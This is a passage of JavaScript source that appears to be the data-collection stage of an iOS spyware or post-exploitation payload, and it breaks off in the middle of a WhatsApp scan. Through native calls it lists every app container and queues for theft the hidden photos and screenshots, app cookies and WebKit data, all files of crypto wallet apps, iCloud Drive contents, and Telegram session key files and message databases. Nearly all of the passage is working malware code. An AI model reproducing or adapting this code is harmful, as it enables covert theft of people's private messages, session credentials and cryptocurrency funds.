filePaths;\n}\n\n/**\n * Get list of hidden photos\n */\nfunction getHiddenPhotos() {\n\treturn queryPhotosDatabase(true);\n}\n\n/**\n * Get list of screenshots\n */\nfunction getScreenshots() {\n\treturn queryPhotosDatabase(false);\n}\n\n/**\n * Download ALL app container data (simpler approach - don't rely on plist parsing)\n * Returns array of files to download, organized by bundle ID\n */\nfunction getAllAppContainerFiles() {\n\tconst appFiles = [];\n\t\n\tconst searchDirs = [\n\t\t\"/private/var/mobile/Containers/Data/Application\",\n\t\t\"/var/mobile/Containers/Data/Application\"\n\t];\n\t\n\t\n\t// Get known bundle IDs from applicationState.db for validation\n\tconst knownBundleIds = getBundleIdLookup();\n\tconst knownCount = Object.keys(knownBundleIds).length / 2; // divided by 2 because we store both original and lowercase\n\t\n\tlet totalContainers = 0;\n\tlet totalFiles = 0;\n\tlet identifiedApps = 0;\n\tconst processedDirs = {};\n\t\n\tfor (const searchDir of searchDirs) {\n\t\tconst dir = Native.callSymbol(\"opendir\", searchDir);\n\t\tif (!dir || dir === 0n) {\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\t// Skip if not a UUID-like directory name\n\t\t\t\tif (name.length < 30) continue;\n\t\t\t\t\n\t\t\t\t// Skip if already processed (avoid duplicates from /private/var vs /var)\n\t\t\t\tif (processedDirs[name]) continue;\n\t\t\t\tprocessedDirs[name] = true;\n\t\t\t\t\n\t\t\t\ttotalContainers++;\n\t\t\t\tconst containerPath = searchDir + \"/\" + name;\n\t\t\t\t\n\t\t\t\t// Try multiple methods to get bundle ID\n\t\t\t\tlet appIdentifier = name; // default to UUID\n\t\t\t\tlet appName = name.substring(0, 8); // default to short UUID\n\t\t\t\tlet foundBundleId = null;\n\t\t\t\t\n\t\t\t\t// Method 1: Try metadata plist (may be blocked by sandbox)\n\t\t\t\tconst metadataPath = containerPath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\tfoundBundleId = metadata.MCMMetadataIdentifier;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Method 2: Look at Library/Preferences for plist files and validate against known bundle IDs\n\t\t\t\tif (!foundBundleId) {\n\t\t\t\t\tconst prefsPath = containerPath + \"/Library/Preferences\";\n\t\t\t\t\tconst prefsDir = Native.callSymbol(\"opendir\", prefsPath);\n\t\t\t\t\tif (prefsDir && prefsDir !== 0n) {\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\twhile (!foundBundleId) {\n\t\t\t\t\t\t\t\tconst prefEntry = Native.callSymbol(\"readdir\", prefsDir);\n\t\t\t\t\t\t\t\tif (!prefEntry || prefEntry === 0n) break;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst prefName = readDirentName(prefEntry);\n\t\t\t\t\t\t\t\tif (!prefName || prefName.length < 5) continue;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Look for .plist files that look like bundle IDs\n\t\t\t\t\t\t\t\tif (prefName.endsWith(\".plist\")) {\n\t\t\t\t\t\t\t\t\t// e.g., \"com.exodus-movement.exodus.plist\" -> \"com.exodus-movement.exodus\"\n\t\t\t\t\t\t\t\t\tconst possibleBundleId = prefName.substring(0, prefName.length - 6); // remove .plist\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t// Skip Apple system bundle IDs - they appear in many containers\n\t\t\t\t\t\t\t\t\tif (possibleBundleId.startsWith(\"com.apple.\")) continue;\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t// Validate against known bundle IDs from applicationState.db\n\t\t\t\t\t\t\t\t\tconst lowerBundleId = possibleBundleId.toLowerCase();\n\t\t\t\t\t\t\t\t\tif (knownBundleIds[lowerBundleId]) {\n\t\t\t\t\t\t\t\t\t\t// Found a match! Use the original case from the database\n\t\t\t\t\t\t\t\t\t\tfoundBundleId = knownBundleIds[lowerBundleId];\n\t\t\t\t\t\t\t\t\t\tif (foundBundleId === true) foundBundleId = possibleBundleId;\n\t\t\t\t\t\t\t\t\t} else if (possibleBundleId.indexOf(\".\") !== -1 && \n\t\t\t\t\t\t\t\t\t           possibleBundleId.split('.').length >= 2) {\n\t\t\t\t\t\t\t\t\t\t// Fallback: looks like a valid non-Apple bundle ID with 2+ dots\n\t\t\t\t\t\t\t\t\t\tfoundBundleId = possibleBundleId;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\tNative.callSymbol(\"closedir\", prefsDir);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Debug: log first container's result\n\t\t\t\tif (totalContainers === 1) {\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (foundBundleId) {\n\t\t\t\t\tidentifiedApps++;\n\t\t\t\t\tappIdentifier = foundBundleId;\n\t\t\t\t\t\n\t\t\t\t\t// Extract readable app name from bundle ID\n\t\t\t\t\t// e.g., \"com.exodus-movement.exodus\" -> \"Exodus\"\n\t\t\t\t\t// e.g., \"org.telegram.Telegram\" -> \"Telegram\"\n\t\t\t\t\tconst parts = appIdentifier.split('.');\n\t\t\t\t\tif (parts.length > 0) {\n\t\t\t\t\t\tappName = parts[parts.length - 1]; // last component\n\t\t\t\t\t\t// Remove common suffixes\n\t\t\t\t\t\tappName = appName.replace(/-ios$/i, '').replace(/-iphone$/i, '');\n\t\t\t\t\t\t// Capitalize first letter\n\t\t\t\t\t\tif (appName.length > 0) {\n\t\t\t\t\t\t\tappName = appName.charAt(0).toUpperCase() + appName.slice(1);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// Log only every 20th container to reduce noise\n\t\t\t\t\tif (totalContainers % 20 === 1) {\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Sanitize for filesystem (keep only alphanumeric, dash, underscore)\n\t\t\t\tconst safeAppName = appName.replace(/[^a-zA-Z0-9_-]/g, '_');\n\t\t\t\t\n\t\t\t\t// Scan key folders: Documents, Library/Cookies, Library/WebKit, Library/Preferences\n\t\t\t\tconst foldersToScan = [\n\t\t\t\t\t{ folder: containerPath + \"/Documents\", category: \"app-documents/\" + safeAppName },\n\t\t\t\t\t{ folder: containerPath + \"/Library/Cookies\", category: \"app-cookies/\" + safeAppName },\n\t\t\t\t\t{ folder: containerPath + \"/Library/WebKit\", category: \"app-webkit/\" + safeAppName },\n\t\t\t\t\t{ folder: containerPath + \"/Library/Preferences\", category: \"app-preferences/\" + safeAppName },\n\t\t\t\t\t{ folder: containerPath + \"/Library/Application Support\", category: \"app-support/\" + safeAppName },\n\t\t\t\t\t{ folder: containerPath + \"/Library/Caches\", category: \"app-caches/\" + safeAppName },\n\t\t\t\t];\n\t\t\t\t\n\t\t\t\tfor (const scanInfo of foldersToScan) {\n\t\t\t\t\t// Check if folder exists first\n\t\t\t\t\tconst folderAccess = Native.callSymbol(\"access\", scanInfo.folder, 0);\n\t\t\t\t\tif (Number(folderAccess) !== 0) continue;\n\t\t\t\t\t\n\t\t\t\t\tconst files = listFilesRecursive(scanInfo.folder, 3, 0); // max 3 levels\n\t\t\t\t\tfor (const f of files) {\n\t\t\t\t\t\t// Skip very large files (over 20MB for app data)\n\t\t\t\t\t\tif (f.size > 20 * 1024 * 1024) continue;\n\t\t\t\t\t\t// Skip empty files\n\t\t\t\t\t\tif (f.size === 0) continue;\n\t\t\t\t\t\t\n\t\t\t\t\t\tappFiles.push({\n\t\t\t\t\t\t\tpath: f.path,\n\t\t\t\t\t\t\tcategory: scanInfo.category,\n\t\t\t\t\t\t\tdescription: appIdentifier,\n\t\t\t\t\t\t\tcontainerUUID: name,\n\t\t\t\t\t\t\tbundleId: appIdentifier\n\t\t\t\t\t\t});\n\t\t\t\t\t\ttotalFiles++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\t\t\n\t}\n\t\n\treturn appFiles;\n}\n\n/**\n * Download crypto wallet app data using pattern matching (if plist parsing works)\n * Falls back to downloading all app data if no matches found\n */\nfunction getCryptoWalletFiles() {\n\tconst walletFiles = [];\n\t\n\t\n\t// Scan AppGroup for wallet group containers first\n\tconst walletGroupContainers = findWalletGroupContainers();\n\t\n\t// Scan group containers\n\tfor (const wallet of walletGroupContainers) {\n\t\tconst files = listFilesRecursive(wallet.groupPath, 5, 0);\n\t\t\n\t\tfor (const file of files) {\n\t\t\tif (file.size > 50 * 1024 * 1024) continue;\n\t\t\tif (file.size === 0) continue;\n\t\t\t\n\t\t\tconst categoryName = wallet.pattern.toLowerCase().replace(/[^a-z0-9]/g, '-');\n\t\t\twalletFiles.push({\n\t\t\t\tpath: file.path,\n\t\t\t\tfilename: getUniqueFilename(file.path),\n\t\t\t\tcategory: \"wallet-\" + categoryName,\n\t\t\t\tdescription: \"Crypto Wallet Group - \" + wallet.bundleId,\n\t\t\t\twalletName: wallet.bundleId,\n\t\t\t\tbundleId: wallet.bundleId\n\t\t\t});\n\t\t}\n\t}\n\t\n\t// Scan Data/Application containers for wallets\n\tconst allBundleIds = getBundleIdLookup();\n\tconst walletBundleIds = [];\n\t\n\tfor (const bundleId of Object.keys(allBundleIds)) {\n\t\tif (bundleId === \"true\") continue;\n\t\tconst bundleIdLower = bundleId.toLowerCase();\n\t\tfor (const pattern of CRYPTO_WALLET_PATTERNS) {\n\t\t\tconst patternLower = pattern.toLowerCase();\n\t\t\tif (bundleIdLower.indexOf(patternLower) !== -1) {\n\t\t\t\twalletBundleIds.push(bundleId);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t\n\t\n\t// Get data container paths\n\tconst containers = getContainerPathsForBundleIds(walletBundleIds);\n\t\n\t// For each found wallet, recursively scan ALL files\n\tfor (const bundleId of Object.keys(containers)) {\n\t\tconst container = containers[bundleId];\n\t\tconst appName = container.name || bundleId;\n\t\tconst categoryName = bundleId.toLowerCase().replace(/[^a-z0-9]/g, '-');\n\t\t\n\t\t\n\t\t// Scan data container if exists\n\t\tif (container.dataPath) {\n\t\t\tconst dirsToScan = [\n\t\t\t\tcontainer.dataPath + \"/Documents\",\n\t\t\t\tcontainer.dataPath + \"/Library\",\n\t\t\t\tcontainer.dataPath + \"/tmp\"\n\t\t\t];\n\t\t\t\n\t\t\tfor (const dir of dirsToScan) {\n\t\t\t\tconst files = listFilesRecursive(dir, 5, 0);\n\t\t\t\t\n\t\t\t\tfor (const file of files) {\n\t\t\t\t\tif (file.size > 50 * 1024 * 1024) continue;\n\t\t\t\t\tif (file.size === 0) continue;\n\t\t\t\t\t\n\t\t\t\t\twalletFiles.push({\n\t\t\t\t\t\tpath: file.path,\n\t\t\t\t\t\tfilename: getUniqueFilename(file.path),\n\t\t\t\t\t\tcategory: \"wallet-\" + categoryName,\n\t\t\t\t\t\tdescription: appName + \" Wallet\",\n\t\t\t\t\t\twalletName: appName,\n\t\t\t\t\t\tbundleId: bundleId\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\t// Scan group container if exists\n\t\tif (container.groupPath) {\n\t\t\tconst files = listFilesRecursive(container.groupPath, 5, 0);\n\t\t\t\n\t\t\tfor (const file of files) {\n\t\t\t\tif (file.size > 50 * 1024 * 1024) continue;\n\t\t\t\tif (file.size === 0) continue;\n\t\t\t\t\n\t\t\t\twalletFiles.push({\n\t\t\t\t\tpath: file.path,\n\t\t\t\t\tfilename: getUniqueFilename(file.path),\n\t\t\t\t\tcategory: \"wallet-\" + categoryName,\n\t\t\t\t\tdescription: appName + \" Wallet Group\",\n\t\t\t\t\twalletName: appName,\n\t\t\t\t\tbundleId: bundleId\n\t\t\t\t});\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn walletFiles;\n}\n\n// OLD VERSION REMOVED - now using direct lookup via getContainerPathsForBundleIds()\n\n/**\n * Generate unique filename with parent directory prefix\n * Example: /path/to/Documents/file.db -> Documents_file.db\n */\nfunction getUniqueFilename(fullPath) {\n\tconst parts = fullPath.split('/');\n\tconst filename = parts[parts.length - 1];\n\tconst parentDir = parts[parts.length - 2] || \"\";\n\t\n\t// For deeply nested files, include more path context\n\tif (parts.length >= 3) {\n\t\tconst parentDir2 = parts[parts.length - 3] || \"\";\n\t\tif (parentDir2 && parentDir2 !== \"Library\" && parentDir2 !== \"Documents\") {\n\t\t\treturn parentDir2 + \"_\" + parentDir + \"_\" + filename;\n\t\t}\n\t}\n\t\n\treturn parentDir + \"_\" + filename;\n}\n\n/**\n * Find crypto wallet AppGroup containers by scanning and matching against wallet patterns\n * Returns array of wallet group container paths\n */\nfunction findWalletGroupContainers() {\n\tconst walletPaths = [];\n\tconst appGroupPath = \"/private/var/mobile/Containers/Shared/AppGroup\";\n\t\n\t\n\tconst dir = Native.callSymbol(\"opendir\", appGroupPath);\n\tif (!dir || dir === 0n) {\n\t\treturn walletPaths;\n\t}\n\t\n\t\n\ttry {\n\t\tlet uuidCount = 0;\n\t\tlet walletCount = 0;\n\t\t\n\t\twhile (true) {\n\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\n\t\t\tconst name = readDirentName(entry);\n\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\n\t\t\t// Check if it looks like a UUID (36 chars)\n\t\t\tif (name.length !== 36) continue;\n\t\t\t\n\t\t\tuuidCount++;\n\t\t\tconst groupDir = appGroupPath + \"/\" + name;\n\t\t\tconst metadataPath = groupDir + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\n\t\t\t// Read the metadata plist\n\t\t\tconst metadataInfo = readInfoPlist(metadataPath);\n\t\t\t\n\t\t\tif (metadataInfo && metadataInfo.MCMMetadataIdentifier) {\n\t\t\t\tconst identifier = metadataInfo.MCMMetadataIdentifier;\n\t\t\t\tconst identifierLower = identifier.toLowerCase();\n\t\t\t\t\n\t\t\t\t// Check if this matches any wallet pattern\n\t\t\t\t// Group containers have \"group.\" prefix, e.g. \"group.com.exodus.wallet\"\n\t\t\t\tlet matchedPattern = \"\";\n\t\t\t\tfor (const pattern of CRYPTO_WALLET_PATTERNS) {\n\t\t\t\t\tconst patternLower = pattern.toLowerCase();\n\t\t\t\t\tif (identifierLower.indexOf(patternLower) !== -1) {\n\t\t\t\t\t\tmatchedPattern = pattern;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (matchedPattern) {\n\t\t\t\t\twalletCount++;\n\t\t\t\t\t\n\t\t\t\t\twalletPaths.push({\n\t\t\t\t\t\tgroupPath: groupDir,\n\t\t\t\t\t\tbundleId: identifier,\n\t\t\t\t\t\tuuid: name,\n\t\t\t\t\t\tpattern: matchedPattern\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t} finally {\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\t\n\treturn walletPaths;\n}\n\n/**\n * Find Telegram data by scanning AppGroup containers\n * Returns array of telegram-data paths found\n */\nfunction findTelegramDataPaths() {\n\tconst telegramPaths = [];\n\tconst appGroupPath = \"/private/var/mobile/Containers/Shared/AppGroup\";\n\t\n\t\n\tconst dir = Native.callSymbol(\"opendir\", appGroupPath);\n\tif (!dir || dir === 0n) {\n\t\treturn telegramPaths;\n\t}\n\t\n\t\n\ttry {\n\t\tlet groupCount = 0;\n\t\tlet uuidCount = 0;\n\t\tlet telegramCount = 0;\n\t\t\n\t\tlet loopCount = 0;\n\t\twhile (true) {\n\t\t\tloopCount++;\n\t\t\tif (loopCount > 500) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\tif (!entry || entry === 0n) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tconst name = readDirentName(entry);\n\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\n\t\t\tgroupCount++;\n\t\t\t\n\t\t\t// Log ALL entries to find the Telegram UUID\n\t\t\t\n\t\t\t// Special check for Telegram UUID\n\t\t\tif (name.indexOf(\"75D26893\") !== -1 || name.indexOf(\"75d26893\") !== -1) {\n\t\t\t}\n\t\t\t\n\t\t\t// Check if it looks like a UUID (36 chars with dashes)\n\t\t\tif (name.length !== 36) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tuuidCount++;\n\t\t\tconst groupDir = appGroupPath + \"/\" + name;\n\t\t\tconst metadataPath = groupDir + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\n\t\t\t// Read the metadata plist\n\t\t\tconst metadataInfo = readInfoPlist(metadataPath);\n\t\t\t\n\t\t\t// Special debug for Telegram UUID\n\t\t\tif (name === \"75D26893-B78C-4875-AFCA-8329A3B2E6EE\") {\n\t\t\t\tif (metadataInfo) {\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tif (metadataInfo && metadataInfo.MCMMetadataIdentifier) {\n\t\t\t\tconst identifier = metadataInfo.MCMMetadataIdentifier;\n\t\t\t\tconst identifierLower = identifier.toLowerCase();\n\t\t\t\t\n\t\t\t\t// Log ALL bundle IDs\n\t\t\t\t\n\t\t\t\t// Check if this is a Telegram container\n\t\t\t\tconst hasTelegra = identifierLower.indexOf(\"telegra\") !== -1;\n\t\t\t\t\n\t\t\t\tif (hasTelegra) {\n\t\t\t\t\t\n\t\t\t\t\t// Check if telegram-data folder exists\n\t\t\t\t\tconst telegramDataPath = groupDir + \"/telegram-data\";\n\t\t\t\t\tif (fileExists(telegramDataPath)) {\n\t\t\t\t\t\ttelegramCount++;\n\t\t\t\t\t\ttelegramPaths.push({\n\t\t\t\t\t\t\tgroupPath: groupDir,\n\t\t\t\t\t\t\ttelegramDataPath: telegramDataPath,\n\t\t\t\t\t\t\tbundleId: identifier,\n\t\t\t\t\t\t\tuuid: name\n\t\t\t\t\t\t});\n\t\t\t\t\t} else {\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t// readdir is limited - try scanning with glob/stat instead\n\t\t// Build a list of ALL UUIDs using a different method\n\t\t\n\t\t// Use stat to test if UUID directories exist (brute force common UUID patterns)\n\t\t// Or reopen and read more entries\n\t\tconst dir2 = Native.callSymbol(\"opendir\", appGroupPath);\n\t\tif (dir2 && dir2 !== 0n) {\n\t\t\ttry {\n\t\t\t\tlet extraCount = 0;\n\t\t\t\twhile (extraCount < 200) {\n\t\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir2);\n\t\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\t\n\t\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\tif (name.length !== 36) continue;\n\t\t\t\t\t\n\t\t\t\t\textraCount++;\n\t\t\t\t\t\n\t\t\t\t\t// Check this entry (might get more than first opendir)\n\t\t\t\t\tconst groupDir = appGroupPath + \"/\" + name;\n\t\t\t\t\tconst metadataPath = groupDir + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\t\t\n\t\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\t\tconst identifier = metadata.MCMMetadataIdentifier;\n\t\t\t\t\t\tconst identifierLower = identifier.toLowerCase();\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (identifierLower.indexOf(\"telegra\") !== -1) {\n\t\t\t\t\t\t\tconst telegramDataPath = groupDir + \"/telegram-data\";\n\t\t\t\t\t\t\tif (fileExists(telegramDataPath)) {\n\t\t\t\t\t\t\t\ttelegramCount++;\n\t\t\t\t\t\t\t\ttelegramPaths.push({\n\t\t\t\t\t\t\t\t\tgroupPath: groupDir,\n\t\t\t\t\t\t\t\t\ttelegramDataPath: telegramDataPath,\n\t\t\t\t\t\t\t\t\tbundleId: identifier,\n\t\t\t\t\t\t\t\t\tuuid: name\n\t\t\t\t\t\t\t\t});\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"closedir\", dir2);\n\t\t\t}\n\t\t}\n\t\t\n\t} finally {\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\t\n\treturn telegramPaths;\n}\n\n/**\n * Download iCloud Drive files\n */\nfunction getiCloudDriveFiles() {\n\tconst icloudFiles = [];\n\tconst icloudBasePath = \"/private/var/mobile/Library/Mobile Documents\";\n\t\n\t\n\t// Check if iCloud Drive is accessible\n\tif (!fileExists(icloudBasePath)) {\n\t\treturn icloudFiles;\n\t}\n\t\n\t// Main iCloud Drive folder\n\tconst icloudDrivePath = icloudBasePath + \"/com~apple~CloudDocs\";\n\t\n\tif (fileExists(icloudDrivePath)) {\n\t\tconst files = listFilesRecursive(icloudDrivePath, 10, 0);\n\t\t\n\t\tfor (const file of files) {\n\t\t\t// Skip very large files\n\t\t\tif (file.size > 50 * 1024 * 1024) continue; // 50MB limit\n\t\t\tif (file.size === 0) continue;\n\t\t\t\n\t\t\t// Create filename with full path context\n\t\t\tconst relativePath = file.path.substring(icloudDrivePath.length + 1);\n\t\t\tconst uniqueName = \"CloudDocs_\" + relativePath.replace(/\\//g, '_');\n\t\t\t\n\t\t\ticloudFiles.push({\n\t\t\t\tpath: file.path,\n\t\t\t\tfilename: uniqueName,\n\t\t\t\tcategory: \"icloud-drive\",\n\t\t\t\tdescription: \"iCloud Drive\"\n\t\t\t});\n\t\t}\n\t}\n\t\n\t// Scan all iCloud folders (com~, iCloud~, and app-specific formats)\n\tconst mobileDocsDir = Native.callSymbol(\"opendir\", icloudBasePath);\n\tif (mobileDocsDir && mobileDocsDir !== 0n) {\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", mobileDocsDir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\t// Skip com~apple~CloudDocs (already scanned above)\n\t\t\t\tif (name === \"com~apple~CloudDocs\") continue;\n\t\t\t\t\n\t\t\t\t// Scan any folder with ~ in name (iCloud storage format)\n\t\t\t\tif (name.indexOf(\"~\") !== -1) {\n\t\t\t\t\tconst appICloudPath = icloudBasePath + \"/\" + name;\n\t\t\t\t\tconst files = listFilesRecursive(appICloudPath, 10, 0);\n\t\t\t\t\t\n\t\t\t\t\t// Determine category based on folder name\n\t\t\t\t\tlet category = \"icloud-app\";\n\t\t\t\t\tif (name.indexOf(\"iCloud~\") === 0) {\n\t\t\t\t\t\tcategory = \"icloud-app\";\n\t\t\t\t\t} else if (name.indexOf(\"com~apple~\") === 0) {\n\t\t\t\t\t\tcategory = \"icloud-apple\";\n\t\t\t\t\t} else {\n\t\t\t\t\t\tcategory = \"icloud-other\";\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tfor (const file of files) {\n\t\t\t\t\t\tif (file.size > 50 * 1024 * 1024) continue;\n\t\t\t\t\t\tif (file.size === 0) continue;\n\t\t\t\t\t\t\n\t\t\t\t\t\t// Include container folder in filename\n\t\t\t\t\t\tconst relativePath = file.path.substring(icloudBasePath.length + 1);\n\t\t\t\t\t\tconst parts = relativePath.split('/');\n\t\t\t\t\t\tconst containerName = parts[0] || \"\";\n\t\t\t\t\t\tconst restPath = parts.slice(1).join('_').replace(/\\//g, '_');\n\t\t\t\t\t\tconst uniqueName = containerName + \"_\" + restPath;\n\t\t\t\t\t\t\n\t\t\t\t\t\ticloudFiles.push({\n\t\t\t\t\t\t\tpath: file.path,\n\t\t\t\t\t\t\tfilename: uniqueName,\n\t\t\t\t\t\t\tcategory: category,\n\t\t\t\t\t\t\tdescription: \"iCloud - \" + name\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", mobileDocsDir);\n\t\t}\n\t}\n\t\n\treturn icloudFiles;\n}\n\n/**\n * Get WhatsApp and Telegram files using direct bundle ID lookup\n */\nfunction getMessengerDatabases() {\n\tconst messengerFiles = [];\n\t\n\t\n\t// Telegram: Use dedicated scan function\n\tconst telegramContainers = findTelegramDataPaths();\n\t\n\tfor (const tgContainer of telegramContainers) {\n\t\t\n\t\t// Scan root telegram-data for .tempkey\n\t\tconst groupScanPaths = [tgContainer.telegramDataPath];\n\t\t\n\t\t// Find account-* folders and accounts-metadata\n\t\tconst telegramDir = Native.callSymbol(\"opendir\", tgContainer.telegramDataPath);\n\t\tif (telegramDir && telegramDir !== 0n) {\n\t\t\ttry {\n\t\t\t\twhile (true) {\n\t\t\t\t\tconst entry = Native.callSymbol(\"readdir\", telegramDir);\n\t\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\t\n\t\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\t\n\t\t\t\t\t// Check for account-* folders\n\t\t\t\t\tif (name.indexOf(\"account-\") === 0) {\n\t\t\t\t\t\tconst accountPath = tgContainer.telegramDataPath + \"/\" + name;\n\t\t\t\t\t\tgroupScanPaths.push(accountPath + \"/postbox/db\");\n\t\t\t\t\t\tgroupScanPaths.push(accountPath);  // For notificationsKey\n\t\t\t\t\t}\n\t\t\t\t\t// Check for accounts-metadata folder\n\t\t\t\t\telse if (name === \"accounts-metadata\") {\n\t\t\t\t\t\tgroupScanPaths.push(tgContainer.telegramDataPath + \"/accounts-metadata\");\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"closedir\", telegramDir);\n\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t// Scan all discovered paths\n\t\tfor (const scanPath of groupScanPaths) {\n\t\t\tconst files = listFilesRecursive(scanPath, 10, 0);\n\t\t\t\n\t\t\tfor (const file of files) {\n\t\t\t\tif (file.size > 100 * 1024 * 1024) continue;\n\t\t\t\tif (file.size === 0) continue;\n\t\t\t\t\n\t\t\t\tconst fileName = file.path.split('/').pop();\n\t\t\t\tconst pathLower = file.path.toLowerCase();\n\t\t\t\t\n\t\t\t\t// Accept:\n\t\t\t\t// 1. .tempkey file\n\t\t\t\t// 2. All files in postbox/db/\n\t\t\t\t// 3. notificationsKey in account-* folders\n\t\t\t\t// 4. All files in accounts-metadata/ (exclude media/)\n\t\t\t\t\n\t\t\t\tconst isTempKey = fileName === \".tempkey\";\n\t\t\t\tconst isInPostboxDb = pathLower.indexOf(\"/postbox/db/\") !== -1;\n\t\t\t\tconst isNotificationsKey = fileName === \"notificationsKey\";\n\t\t\t\tconst isInAccountsMetadata = pathLower.indexOf(\"/accounts-metadata/\") !== -1 && pathLower.indexOf(\"/media/\") === -1;\n\t\t\t\t\n\t\t\t\tif (!isTempKey && !isInPostboxDb && !isNotificationsKey && !isInAccountsMetadata) {\n\t\t\t\t\tcontinue; // Skip this file\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst uniqueFilename = getUniqueFilename(file.path);\n\t\t\t\t\n\t\t\t\tmessengerFiles.push({\n\t\t\t\t\tpath: file.path,\n\t\t\t\t\tfilename: uniqueFilename,\n\t\t\t\t\tcategory: \"telegram\",\n\t\t\t\t\tdescription: \"Telegram - \" + tgContainer.bundleId\n\t\t\t\t});\n\t\t\t}\n\t\t}\n\t}\n\t\n\t// WhatsApp: Scan AppGroup for WhatsApp group containers (like we do for Telegram)\n\tconst whatsappGroupContainers = [];\n\tconst appGroupPath = \"/private/var/mobile/Containers/Shared/AppGroup\";\n\t\n\tconst waGroupDir = Native.callSymbol(\"opendir\", appGroupPath);\n\tif (waGroupDir && waGroupDir !== 0n) {\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", waGroupDir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\tif (name.length !== 36) continue; // UUID format\n\t\t\t\t\n\t\t\t\tconst groupDir = appGroupPath + \"/\" + name;\n\t\t\t\tconst metadataPath = groupDir + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\t\n\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\tconst identifier = metadata.MCMMetadataIdentifier;\n\t\t\t\t\tconst identifierLower = identifier.toLowerCase();\n\t\t\t\t\t\n\t\t\t\t\t// Check if this is a WhatsApp group container\n\t\t\t\t\tif (identifierLower.indexOf(\"whatsapp\") !== -1) {\n\t\t\t\t\t\twhatsappGroupContainers.push({\n\t\t\t\t\t\t\tgroupPath: groupDir,\n\t\t\t\t\t\t\tbundleId: 